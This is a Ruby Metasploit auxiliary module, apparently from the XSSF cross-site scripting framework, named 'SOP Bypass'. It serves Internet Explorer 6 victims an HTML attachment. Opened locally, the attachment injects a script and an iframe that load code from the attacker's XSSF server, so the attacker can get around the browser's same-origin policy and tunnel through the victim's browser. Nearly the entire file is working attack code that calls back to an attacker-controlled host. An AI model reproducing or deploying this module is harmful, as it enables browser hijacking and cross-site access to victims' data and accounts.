require 'msf/core'
require 'msf/base/xssf'

#
# READ README_XSSF FILE FOR MORE INFORMATION ABOUT MODULES
#
class Metasploit3 < Msf::Auxiliary
	include Msf::Xssf::XssfServer

	# Module initialization
	def initialize(info = {})
		super(update_info(info,
			'Name'        => 'SOP Bypass',
			'Description' => 'Bypassing SOP Restriction with a local file infected with XSS (only for ie 6)'
		))
	end

	# Part sent to the victim, insert your code here !!!
	def on_request_uri(cli, req)
		case req.uri_parts['Resource']
			when /sop\.htm/
				code = %Q{<html><body>
					<script>
						script = document.createElement('script');
						script.id = "SOP";
						script.src = XSSF_SERVER + "loop?interval=1";
						document.body.appendChild(script);
					</script>
				</body></html>}
				send_response(cli, code, {"Content-disposition" => "attachment"})
				# This will display an 'open / save' dialog to the victim. One clicked on OK, victim will be on file:/// location
				# and SOP can be bypassed (try visiting any website with XSS Tunnel).
			else
				code = %Q{
					clearInterval(XSSF_LOOP);		// Kills the first loop

					iframe = XSSF_CREATE_IFRAME("XSS_SOP", 0, 0);
					iframe.src = XSSF_SERVER + "sop.htm";
					document.body.appendChild(iframe);	
				}
				send_response(cli, code)
		end
	end
end